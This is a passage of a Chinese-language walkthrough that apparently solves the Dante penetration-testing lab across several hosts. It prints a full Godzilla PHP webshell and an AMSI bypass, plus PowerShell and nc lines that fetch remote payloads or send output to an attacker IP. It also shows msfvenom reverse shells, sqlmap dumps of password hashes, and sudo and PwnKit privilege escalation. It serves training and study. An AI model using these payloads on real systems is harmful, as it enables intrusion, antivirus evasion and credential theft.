</ul>

<p>注册的时候可以上传一个 webshell。上传成功后进行登陆，然后可以在 /ups/ 目录下访问。</p>

<p>简单的 eval webshell 会被杀，但杀软并不强，godzilla PHP_XOR_BASE64 可以正常上传。</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nf">error_rfsting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">function</span> <span class="n">encode</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$K</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span>
        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$c</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$pass</span><span class="o">=</span><span class="s1">'pass'</span><span class="p">;</span>
<span class="nv">$payloadName</span><span class="o">=</span><span class="s1">'payload'</span><span class="p">;</span>
<span class="nv">$key</span><span class="o">=</span><span class="s1">'3c6e0b8a9c15224a'</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$pass</span><span class="p">])){</span>
    <span class="nv">$data</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$pass</span><span class="p">]),</span><span class="nv">$key</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">])){</span>
        <span class="nv">$payload</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">],</span><span class="nv">$key</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">===</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$payload</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
                <span class="k">eval</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="mf">.</span><span class="nv">$key</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nf">encode</span><span class="p">(</span><span class="o">@</span><span class="nf">run</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="nv">$key</span><span class="p">));</span>
        <span class="k">echo</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="mf">.</span><span class="nv">$key</span><span class="p">),</span><span class="mi">16</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="s2">"getBasicsInfo"</span><span class="p">)</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">]</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>得到 webshell 后可以在 C:\Users\gerald\Desktop 下找到 flag.txt</p>

<p>Godzilla 中直接反弹 msf meterpreter 会断掉，生成一个 msf windows https 载荷。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>10.10.14.5 <span class="nv">LPORT</span><span class="o">=</span>8443 <span class="nt">-f</span> exe <span class="nt">-o</span> wintest.txt
</code></pre></div></div>
<p>msfconsole 中执行：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>payload payload/windows/x64/meterpreter/reverse_https
<span class="nb">set </span>LPOrt 8443
<span class="nb">set </span>exitonsession <span class="nb">false
</span>exploit <span class="nt">-j</span>
</code></pre></div></div>
<p>在 webshell 中用 wget 下载载荷。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell wget http://10.10.14.5:9999/wintest.txt <span class="nt">-o</span> test.exe
</code></pre></div></div>
<p>执行后可以得到 meterpreter。</p>
<h2 id="提权信息收集-winpeas">提权信息收集: winPEAS</h2>
<p>远程加载 PowerSharpPack.ps1</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iex<span class="o">(</span>new-object net.webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">'http://10.10.14.5:9999/PowerSharpPack.ps1'</span><span class="o">)</span>
</code></pre></div></div>
<p>加载时返回下面的报错，应该是没有绕过 AMSI。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This script contains malicious content and has been blocked by your antivirus software.
</code></pre></div></div>
<p>绕过 AMSI：</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$x</span><span class="o">=</span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.Am'</span><span class="o">+</span><span class="s1">'siUt'</span><span class="o">+</span><span class="s1">'ils'</span><span class="p">);</span><span class="nv">$y</span><span class="o">=</span><span class="nv">$x</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'am'</span><span class="o">+</span><span class="s1">'siCon'</span><span class="o">+</span><span class="s1">'text'</span><span class="p">,[</span><span class="n">Reflection.BindingFlags</span><span class="p">]</span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="nv">$z</span><span class="o">=</span><span class="nv">$y</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">);[</span><span class="n">Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">WriteInt32</span><span class="p">(</span><span class="nv">$z</span><span class="p">,</span><span class="mi">0</span><span class="n">x41424344</span><span class="p">)</span><span class="w">

</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">system.net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.10.14.5:9999/amsi_rmouse.txt'</span><span class="p">)</span><span class="o">|</span><span class="nx">IEX</span><span class="w">
</span></code></pre></div></div>
<p>再次加载 PowerSharpPack.ps1</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.10.14.5:9999/PowerSharpPack.ps1'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>
<p>执行 winPEAS 组件：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PowerSharpPack <span class="nt">-winPEAS</span>
</code></pre></div></div>
<p>执行之后可以得到大量的输出。</p>
<ol>
  <li>存在历史漏洞 CVE-2019-1385、CVE-2019-1405
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">[</span>?] Windows vulns search powered by Watson<span class="o">(</span>https://github.com/rasta-mouse/Watson<span class="o">)</span>
     OS Build Number: 18363
     <span class="o">[!]</span> CVE-2019-1385 : VULNERABLE
         <span class="o">[&gt;]</span> https://www.youtube.com/watch?v<span class="o">=</span>K6gHnr-VkAg

     <span class="o">[!]</span> CVE-2019-1405 : VULNERABLE
         <span class="o">[&gt;]</span> https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/ 
</code></pre></div>    </div>
  </li>
  <li>Interesting Services -non Microsoft
    <ol>
      <li>Druva</li>
      <li>OpenSSH</li>
    </ol>
  </li>
  <li>DLL 劫持路径
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> C:\WINDOWS\system32
 C:\WINDOWS
 C:\WINDOWS\System32\Wbem
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\
 C:\WINDOWS\System32\OpenSSH\
</code></pre></div>    </div>
  </li>
</ol>

<h2 id="提权cve-2019-1405未成功">提权：CVE-2019-1405(未成功)</h2>
<p>当 Windows 通用即插即用 (UPnP) 服务不正确地允许 COM 对象创建时，就会存在权限提升漏洞，因此该漏洞也被称为”Windows UPnP 服务权限提升漏洞”。</p>

<p>Exp</p>
<ul>
  <li>https://github.com/apt69/COMahawk</li>
  <li>https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2019-1405</li>
</ul>

<p>上传 exp，执行后未成功。</p>

<h2 id="漏洞服务提权druva">漏洞服务提权（Druva）</h2>
<p>winPEAS 对非 Microsoft 的服务进行扫描时，扫描出了一个 Druva 服务。</p>

<p>msf 搜索 Druva 可以得到一个提权 exp。</p>
<ul>
  <li>exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc</li>
</ul>

<p>Druva 的版本信息可以通过查看 licence.txt 文件获取。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> <span class="s2">"c:</span><span class="se">\P</span><span class="s2">rogram Files (x86)</span><span class="se">\D</span><span class="s2">ruva</span><span class="se">\i</span><span class="s2">nSync</span><span class="se">\l</span><span class="s2">icence.txt"</span>
Druva InSync 6.6.3
Copyright <span class="o">(</span>c<span class="o">)</span> 2019 Druva Inc. 
</code></pre></div></div>
<p>6.6.3 版本也在 exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc 的利用范围内。</p>

<p>利用后可以得到 SYSTEM 权限。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.14.5
LHOST <span class="o">=&gt;</span> 10.10.14.5
msf6 exploit<span class="o">(</span>windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 5555
msf6 exploit<span class="o">(</span>windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 39
session <span class="o">=&gt;</span> 39
msf6 exploit<span class="o">(</span>windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:5555 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">"set AutoCheck false"</span> to disable<span class="o">)</span>
<span class="o">[!]</span> The service is running, but could not be validated. Service <span class="s1">'inSyncCPHService'</span> exists.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to 127.0.0.1:6064 ...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending packet <span class="o">(</span>260 bytes<span class="o">)</span> to 127.0.0.1:6064 ...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175686 bytes<span class="o">)</span> to 10.10.110.3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 41 opened <span class="o">(</span>10.10.14.5:5555 -&gt; 10.10.110.3:21927<span class="o">)</span> at 2023-12-26 20:01:51 <span class="nt">-0500</span>

meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<h1 id="linux-17216112">Linux: 172.16.1.12</h1>
<p>开放端口：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.1.12	21
172.16.1.12	80
172.16.1.12	22
172.16.1.12	443
172.16.1.12	3306
</code></pre></div></div>
<h2 id="80-端口-sql-注入">80 端口 SQL 注入</h2>
<p>80 端口也是一个 xampp 服务，与 172.16.1.13 的版本基本一致。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python /webtools/dirscan/dirsearch/dirsearch.py <span class="nt">-u</span> http://172.16.1.12 <span class="nt">-e</span> php <span class="nt">-p</span> socks5://localhost:1080 <span class="nt">-w</span> /webtools/dicts/SecLists/Discovery/Web-Content/common.txt

<span class="o">[</span>20:11:05] Starting:                                                                                                                                            
<span class="o">[</span>20:11:27] 301 -  232B  - /blog  -&gt;  http://172.16.1.12/blog/               
<span class="o">[</span>20:11:31] 403 -    1KB - /cgi-bin/                                         
<span class="o">[</span>20:11:37] 301 -  237B  - /dashboard  -&gt;  http://172.16.1.12/dashboard/     
<span class="o">[</span>20:11:47] 200 -   30KB - /favicon.ico                                      
<span class="o">[</span>20:11:56] 301 -  231B  - /img  -&gt;  http://172.16.1.12/img/                 
<span class="o">[</span>20:12:17] 403 -    1KB - /phpmyadmin                                       
<span class="o">[</span>20:12:48] 301 -  237B  - /webalizer  -&gt;  http://172.16.1.12/webalizer/  
</code></pre></div></div>
<p>扫描到一个 /blog 目录。</p>

<p>根据博客的 footer 信息：<code class="language-plaintext highlighter-rouge">Responsive Blog Site 2023 - Brought To You by Ser Bermz</code> 可以找到该 CMS 的相关信息：https://www.youtube.com/channel/UCsFgC9ggwrmYR2XqEHXpbNg</p>

<table>
  <tbody>
    <tr>
      <td>进一步定位到源码：[Responsive Online Blog Website Using PHP/MySQL</td>
      <td>CampCodes](https://www.campcodes.com/projects/php/responsive-online-blog-website-using-php-mysql-free-download/)</td>
    </tr>
  </tbody>
</table>

<p>在 exploitdb 中可以查询到该 CMS 的历史漏洞</p>
<ul>
  <li><a href="https://www.exploit-db.com/exploits/48615">Responsive Online Blog 1.0 - ‘id’ SQL Injection - PHP webapps Exploit</a></li>
</ul>

<p>POC:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="s1">'http://172.16.1.12/blog/category.php?id=1'</span> <span class="nt">--dbs</span> <span class="nt">--batch</span> <span class="nt">--proxy</span> socks5://localhost:1080
</code></pre></div></div>
<p>枚举出所有的数据库</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET parameter <span class="s1">'id'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 202 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: <span class="nb">id</span> <span class="o">(</span>GET<span class="o">)</span>
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <span class="nb">id</span><span class="o">=</span>1<span class="s1">' RLIKE (SELECT (CASE WHEN (1163=1163) THEN 1 ELSE 0x28 END))-- mDDs

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1'</span> AND <span class="o">(</span>SELECT 3351 FROM<span class="o">(</span>SELECT COUNT<span class="o">(</span><span class="k">*</span><span class="o">)</span>,CONCAT<span class="o">(</span>0x7176626a71,<span class="o">(</span>SELECT <span class="o">(</span>ELT<span class="o">(</span><span class="nv">3351</span><span class="o">=</span>3351,1<span class="o">)))</span>,0x71706b6a71,FLOOR<span class="o">(</span>RAND<span class="o">(</span>0<span class="o">)</span><span class="k">*</span>2<span class="o">))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span class="o">)</span>a<span class="o">)</span><span class="nt">--</span> QmkZ

    Type: time-based blind
    Title: MySQL <span class="o">&gt;=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
    Payload: <span class="nb">id</span><span class="o">=</span>1<span class="s1">' AND (SELECT 5794 FROM (SELECT(SLEEP(5)))qeMR)-- MjCh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=-4778'</span> UNION ALL SELECT NULL,CONCAT<span class="o">(</span>0x7176626a71,0x50687146794d544756786254455a6153556a736c776e696c6e77516c78476a454c636c727474756d,0x71706b6a71<span class="o">)</span><span class="c">#</span>
<span class="nt">---</span>
<span class="o">[</span>20:46:01] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7, Apache 2.4.43
back-end DBMS: MySQL <span class="o">&gt;=</span> 5.0 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>20:46:03] <span class="o">[</span>INFO] fetching database names
<span class="o">[</span>20:46:06] <span class="o">[</span>INFO] retrieved: <span class="s1">'information_schema'</span>
<span class="o">[</span>20:46:07] <span class="o">[</span>INFO] retrieved: <span class="s1">'test'</span>
<span class="o">[</span>20:46:08] <span class="o">[</span>INFO] retrieved: <span class="s1">'performance_schema'</span>
<span class="o">[</span>20:46:09] <span class="o">[</span>INFO] retrieved: <span class="s1">'flag'</span>
<span class="o">[</span>20:46:10] <span class="o">[</span>INFO] retrieved: <span class="s1">'mysql'</span>
<span class="o">[</span>20:46:11] <span class="o">[</span>INFO] retrieved: <span class="s1">'blog_admin_db'</span>
<span class="o">[</span>20:46:12] <span class="o">[</span>INFO] retrieved: <span class="s1">'phpmyadmin'</span>
available databases <span class="o">[</span>7]:                                                                                                                                       
<span class="o">[</span><span class="k">*</span><span class="o">]</span> blog_admin_db
<span class="o">[</span><span class="k">*</span><span class="o">]</span> flag
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> mysql
<span class="o">[</span><span class="k">*</span><span class="o">]</span> performance_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> phpmyadmin
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">test</span>
</code></pre></div></div>
<p>逐步获取 flag 数据库中的字段。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="s1">'http://172.16.1.12/blog/category.php?id=1'</span> <span class="nt">--dbs</span> <span class="nt">--batch</span> <span class="nt">--proxy</span> socks5://localhost:1080 <span class="nt">-D</span> flag <span class="nt">-T</span> flag <span class="nt">-C</span> flag <span class="nt">--dump</span>

<span class="o">[</span>20:48:28] <span class="o">[</span>INFO] fetching entries of column<span class="o">(</span>s<span class="o">)</span> <span class="s1">'flag'</span> <span class="k">for </span>table <span class="s1">'flag'</span> <span class="k">in </span>database <span class="s1">'flag'</span>
Database: flag
Table: flag
<span class="o">[</span>1 entry]
+------------------------------+
| flag                         |
+------------------------------+
| DANTE<span class="o">{</span>wHy_y0U_n0_s3cURe?!?!<span class="o">}</span> |
+------------------------------+
</code></pre></div></div>

<p>使用 –os-shell 无法写入 webshell，可能是没有写权限，无法成功。</p>

<p>尝试在 blog_admin_db 中寻找一些敏感信息。枚举所有用户：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="s1">'http://172.16.1.12/blog/category.php?id=1'</span> <span class="nt">--batch</span> <span class="nt">--proxy</span> socks5://localhost:1080 <span class="nt">--technique</span> U <span class="nt">-D</span> blog_admin_db <span class="nt">-T</span> membership_users <span class="nt">--dump</span>
</code></pre></div></div>

<p>结果如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin	21232f297a57a5a743894a0e4a801fc3 <span class="o">(</span>admin<span class="o">)</span>
egre55	d6501933a2e0ea1f497b87473051417f
<span class="nb">test	</span>098f6bcd4621d373cade4e832627b4f6 <span class="o">(</span><span class="nb">test</span><span class="o">)</span>
test1	739969b53246b2c727850dbb3490ede6 <span class="o">(</span>test9<span class="o">)</span>
test2	ad0234829205b9033196ba818f7a872b <span class="o">(</span>test2<span class="o">)</span>
memberID	passMD5
ben	442179ad1de9c25593cabf625c0badb7
</code></pre></div></div>
<h2 id="md5-爆破john">MD5 爆破（john）</h2>
<p>ben 用户的 hash 可以使用 john 进行爆破，得到密码: Welcometomyblog</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/webtools/dicts/rockyou.txt md5hash <span class="nt">--format</span><span class="o">=</span>Raw-MD5
</code></pre></div></div>

<p>使用上面的凭证登陆 ssh，admin 用户得到 Permission denied，ben 用户可以成功登陆。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> ssh ben@172.16.1.12
</code></pre></div></div>
<p>使用 linPEAS 进行提权信息收集</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># linPEAS</span>
nc <span class="nt">-lvnp</span> 9002 | <span class="nb">tee </span>linpeas.out <span class="c">#Host</span>
wget <span class="nt">-q</span> <span class="nt">-O-</span> 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 <span class="c">#Victim</span>
</code></pre></div></div>

<h2 id="提权-pwnkit">提权: PwnKit</h2>
<p>linPEAS 扫描出较多提权漏洞:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] <span class="o">[</span>CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>10|11|12|13|14|15|16|17|18|19|20|21 <span class="o">]</span>,debian<span class="o">=</span>7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: <span class="nv">mint</span><span class="o">=</span>19,[ <span class="nv">ubuntu</span><span class="o">=</span>18|20 <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: <span class="nv">centos</span><span class="o">=</span>6|7|8,[ <span class="nv">ubuntu</span><span class="o">=</span>14|16|17|18|19|20 <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2022-32250] nft_object UAF <span class="o">(</span>NFT_MSG_NEWSET<span class="o">)</span>

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>22.04<span class="o">){</span>kernel:5.15.0-27-generic<span class="o">}</span>
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>

<span class="o">[</span>+] <span class="o">[</span>CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>20.04<span class="o">){</span>kernel:5.12.13<span class="o">}</span>
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=</span>20.04<span class="o">{</span>kernel:5.8.0-<span class="k">*</span><span class="o">}</span>
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

<span class="o">[</span>+] <span class="o">[</span>CVE-2019-18634] <span class="nb">sudo </span>pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: <span class="nv">mint</span><span class="o">=</span>19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: <span class="nb">sudo </span>configuration requires pwfeedback to be enabled.

<span class="o">[</span>+] <span class="o">[</span>CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class="o">=</span>1072
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=</span>16.04<span class="o">{</span>ntfs-3g:2015.3.14AR.1-1build1<span class="o">}</span>,debian<span class="o">=</span>7.0<span class="o">{</span>ntfs-3g:2012.1.15AR.5-2.1+deb7u2<span class="o">}</span>,debian<span class="o">=</span>8.0<span class="o">{</span>ntfs-3g:2014.2.15AR.2-1+deb8u2<span class="o">}</span>
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

</code></pre></div></div>
<p>Pwnkit 可成功提权。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ben@DANTE-NIX04:~/.tmp<span class="nv">$ </span>./.pw
root@DANTE-NIX04:/home/ben/.tmp# 
</code></pre></div></div>
<h2 id="提权-sudo--1828">提权: sudo &lt; 1.8.28</h2>
<p>sudo 版本为 1.8.27。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ben@DANTE-NIX04:~/.tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-V</span>
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27 
</code></pre></div></div>
<p>hacktricks 中记录了一个 sudo 版本小于 1.8.28 的 payload</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
</code></pre></div></div>
<p>可以直接提权到 root</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ben@DANTE-NIX04:~/.tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
root@DANTE-NIX04:/home/ben/.tmp# 
</code></pre></div></div>

<p>/etc/shadow 文件中包含了一个提示：CrackMe。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>julian:<span class="nv">$1$CrackMe$U93HdchOpEUP9iUxGVIvq</span>/:18439:0:99999:7:::
</code></pre></div></div>
<p>将 /etc/passwd 和 /etc/shadow 文件保存到本地，使用 unshadow 组合成一个文件，删除文件中的其他行，只留下 julian，最后使用 john 爆破。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow 172.16.1.12_etc_passwd 172.16.1.12_shadowhash <span class="o">&gt;</span> 172.16.1.12_unshadow

john <span class="nt">--wordlist</span><span class="o">=</span>/webtools/dicts/rockyou.txt 172.16.1.12_unshadow
</code></pre></div></div>
<p>第一次爆破没有得到结果，但 john 提示我们使用参数 <code class="language-plaintext highlighter-rouge">--format=md5crypt-long</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
